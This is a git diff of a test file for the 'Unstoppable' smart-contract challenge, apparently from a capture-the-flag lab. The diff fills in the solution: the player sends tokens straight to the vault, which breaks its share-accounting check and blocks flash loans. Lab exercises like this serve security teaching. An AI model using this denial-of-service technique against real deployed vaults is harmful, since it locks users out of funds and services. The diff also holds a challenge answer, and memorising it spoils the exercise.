@@ -44,7 +44,10 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Simply transfer the token to vault, so we can break the `convertToShares(totalSupply) != balanceBefore`
+        // check during flashloans.
+        const tokenConnectedToPlayer = token.connect(player);
+        await tokenConnectedToPlayer.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
